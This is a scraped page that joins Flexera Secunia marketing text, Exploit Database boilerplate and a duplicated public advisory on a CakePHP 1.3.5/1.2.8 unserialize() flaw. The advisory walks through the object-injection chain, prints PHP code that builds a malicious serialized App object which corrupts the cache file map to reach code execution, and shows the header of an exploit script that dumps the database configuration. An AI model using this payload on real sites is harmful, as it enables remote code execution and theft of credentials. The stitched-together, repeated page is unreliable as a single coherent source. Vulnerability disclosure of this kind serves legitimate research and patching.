How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

CakePHP <= 1.3.5 / 1.2.8 unserialize() Vulnerability
felix |at| malloc.im
===========================================================================
====

Overview:

"CakePHP is a rapid development framework for PHP that provides an
extensible
architecture for developing, maintaining, and deploying applications.
Using
commonly known design patterns like MVC and ORM within the convention over
configuration paradigm, CakePHP reduces development costs and helps
developers
write less code." - cakephp.org

CakePHP is vulnerable to a file inclusion attack because of its use of the
"unserialize()" function on unchecked user input. This makes it possible
to inject arbitary objects into the scope.

Details:

CakePHP uses the following function in the Security component
to protect against XSRF attacks with POST Requests:

function _validatePost(&$controller) {
-- snip --
$check = $controller->data;
$token = urldecode($check['_Token']['fields']);

if (strpos($token, ':')) {
list($token, $locked) = explode(':', $token, 2);
}

$locked = unserialize(str_rot13($locked));
-- snip --

The $check array contains our POST data and $locked is
a simple (rot-13 obfuscated) serialized string, which is completely
under our control.

PHP5 introduces a destructor with the "__destruct" method. Each object
will execute its __destruct method at the end of its lifetime and we can
use this to turn an unchecked unserialize() call in an useful exploit.
(See Stefan Essers talk @
http://www.suspekt.org/downloads/POC2009-ShockingNewsInPHPExploitation.pdf
for more information)

CakePHP defines the App Class with the following destruct method:

function __destruct() {
if ($this->__cache) {
$core = App::core('cake');
unset($this->__paths[rtrim($core[0], DS)]);
Cache::write('dir_map', array_filter($this->__paths),
'_cake_core_');
Cache::write('file_map', array_filter($this->__map),
'_cake_core_');
Cache::write('object_map', $this->__objects, '_cake_core_');
}
}

As we can see, this method can be abused by an manipulated object to write
arbitary values into the _cake_core Cache.

The most interesting key to corrupt is the file_map. It provides the
mapping between Classes and PHP Files and is used to load additional
Classes at runtime.
The real code for the loading of classes is a bit complicated but it all
boils down to the following code in the __load method inside the App
class:

if (file_exists($file)) {
if (!$this->return) {
require($file);

$this->__loaded[$file] = true;
}
return true;

This means we can execute arbitary files on the local filesystem.
CakePHP uses a file based caching system in its standard configuration,
and the cache data is written in serialized form to a known location.

We can use this information to create a create a manipulated App object
that executes our PHP Payload:

$x=new App();
$x->__cache=1;
$x->__map=array("Core" => array("Router"
=> "../tmp/cache/persistent/cake_core_file_map"),
"Foo" => "<? phpinfo(); exit(); ?>");
$x->__paths=array();
$x->__objects=array();
echo serialize($x);

POC:

See http://malloc.im/burnedcake.py for a working POC exploit.
PoC also shown below.

Patch:

This bug was patched in Version 1.3.6 and 1.2.9

#!/usr/bin/python
#
# burnedCake.py - CakePHP <= 1.3.5 / 1.2.8 Cache Corruption Exploit
# written by felix@malloc.im
#
# This code exploits a unserialize() vulnerability in the CakePHP security
# component. See http://malloc.im/CakePHP-unserialize.txt for a detailed
# analysis of the vulnerability.
#
# The exploit should work against every CakePHP based Application, that
# uses POST forms with security tokens and hasn't changed the Cache
# configuration (file-system caching is standard). Exploiting
# other caching configurations is possible but not as elegant.
#
# This POC will output the database config file of the running CakePHP Application,
# other payloads are easily possibe with a changed PHP Code.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

 CakePHP <= 1.3.5 / 1.2.8 unserialize() Vulnerability
felix |at| malloc.im
===============================================================================
Overview:
"CakePHP is a rapid development framework for PHP that provides an extensible
architecture for developing, maintaining, and deploying applications. Using
commonly known design patterns like MVC and ORM within the convention over
configuration paradigm, CakePHP reduces development costs and helps developers
write less code." - cakephp.org
CakePHP is vulnerable to a file inclusion attack because of its use of the
"unserialize()" function on unchecked user input. This makes it possible
to inject arbitary objects into the scope.
Details:
CakePHP uses the following function in the Security component
to protect against XSRF attacks with POST Requests:
function \_validatePost(&$controller) {
-- snip --
$check = $controller->data;
$token = urldecode($check['\_Token']['fields']);
if (strpos($token, ':')) {
list($token, $locked) = explode(':', $token, 2);
}
$locked = unserialize(str\_rot13($locked));
-- snip --
The $check array contains our POST data and $locked is
a simple (rot-13 obfuscated) serialized string, which is completely
under our control.
PHP5 introduces a destructor with the "\_\_destruct" method. Each object
will execute its \_\_destruct method at the end of its lifetime and we can
use this to turn an unchecked unserialize() call in an useful exploit.
(See Stefan Essers talk @
http://www.suspekt.org/downloads/POC2009-ShockingNewsInPHPExploitation.pdf
for more information)
CakePHP defines the App Class with the following destruct method:
function \_\_destruct() {
if ($this->\_\_cache) {
$core = App::core('cake');
unset($this->\_\_paths[rtrim($core[0], DS)]);
Cache::write('dir\_map', array\_filter($this->\_\_paths), '\_cake\_core\_');
Cache::write('file\_map', array\_filter($this->\_\_map), '\_cake\_core\_');
Cache::write('object\_map', $this->\_\_objects, '\_cake\_core\_');
}
}
As we can see, this method can be abused by an manipulated object to write
arbitary values into the \_cake\_core Cache.
The most interesting key to corrupt is the file\_map. It provides the
mapping between Classes and PHP Files and is used to load additional
Classes at runtime.
The real code for the loading of classes is a bit complicated but it all
boils down to the following code in the \_\_load method inside the App class:
if (file\_exists($file)) {
if (!$this->return) {
require($file);
$this->\_\_loaded[$file] = true;
}
return true;
This means we can execute arbitary files on the local filesystem.
CakePHP uses a file based caching system in its standard configuration,
and the cache data is written in serialized form to a known location.
We can use this information to create a create a manipulated App object
that executes our PHP Payload:
$x=new App();
$x->\_\_cache=1;
$x->\_\_map=array("Core" => array("Router"
=> "../tmp/cache/persistent/cake\_core\_file\_map"),
"Foo" => "<? phpinfo(); exit(); ?>");
$x->\_\_paths=array();
$x->\_\_objects=array();
echo serialize($x);
POC:
See http://malloc.im/burnedcake.py for a working POC exploit.
Patch:
This bug was patched in Version 1.3.6 and 1.2.9
